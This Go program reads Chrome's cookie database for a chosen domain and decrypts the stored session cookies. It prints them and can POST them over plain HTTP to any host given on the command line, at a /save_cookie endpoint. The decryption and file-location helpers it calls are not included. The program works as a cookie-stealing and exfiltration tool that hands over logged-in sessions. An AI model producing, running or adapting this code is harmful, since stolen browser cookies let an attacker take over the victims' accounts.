package main

import (
	"bytes"
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"os"

	_ "github.com/mattn/go-sqlite3"
)

// Cookie - Items for a cookie
type Cookie struct {
	Domain         string
	Key            string
	Value          string
	EncryptedValue []byte
}

// DecryptedValue - Get the unencrypted value of a Chrome cookie
func (c *Cookie) DecryptedValue() string {
	if c.Value > "" {
		return c.Value
	}

	if len(c.EncryptedValue) > 0 {
		//encryptedValue := c.EncryptedValue[3:]
		encryptedValue := c.EncryptedValue
		return decryptValue(encryptedValue)
	}

	return ""
}

func usage() {
	fmt.Fprintf(os.Stderr, "usage: %s [domain] [dest]\n", os.Args[0])
	os.Exit(2)
}

func main() {
	if len(os.Args) < 2 || len(os.Args) > 3 {
		usage()
	}

	domain := os.Args[1]
	dest := ""
	if len(os.Args) == 3 {
		dest = os.Args[2]
	}
	//password = getPassword()

	// TODO: Output in Netscape format

	data := &bytes.Buffer{}
	// var cs []*http.Cookie
	for _, cookie := range getCookies(domain) {
		fmt.Fprintf(data, "%s=%s\n", cookie.Key, cookie.DecryptedValue())
		// cookie := &http.Cookie{Name: cookie.Key, Value: cookie.DecryptedValue()}
		// cs = append(cs, cookie)
	}
	fmt.Printf("%s", data.String())
	if len(dest) > 0 {
		res, err := http.Post(fmt.Sprintf("http://%s/save_cookie", dest), "text/plain", data)
		if nil != err {
			log.Printf("Failed to save cookie:%v", err)
		} else {
			res.Body.Close()
		}
	}

	// tmp, _ := http.NewRequest("Get", "http://google.com", nil)
	// for _, c := range cs {
	// 	tmp.AddCookie(c)
	// }
	// ss, _ := httputil.DumpRequest(tmp, true)
	// fmt.Printf("%s", string(ss))
}

func getCookies(domain string) (cookies []Cookie) {

	cookiesFile := getChromeCookieFile()
	//cookiesFile := fmt.Sprintf("%s/Library/Application Support/Google/Chrome/Default/Cookies", usr.HomeDir)
	//cookiesFile := "./Cookies"

	db, err := sql.Open("sqlite3", cookiesFile)
	if err != nil {
		log.Printf("#####open %s %v", cookiesFile, err)
		log.Fatal(err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT name, value, host_key, encrypted_value FROM cookies WHERE host_key like ?", fmt.Sprintf("%%%s%%", domain))
	if err != nil {
		log.Fatal(err)
	}

	defer rows.Close()
	for rows.Next() {
		var name, value, hostKey string
		var encryptedValue []byte
		rows.Scan(&name, &value, &hostKey, &encryptedValue)
		cookies = append(cookies, Cookie{hostKey, name, value, encryptedValue})
	}

	return
}
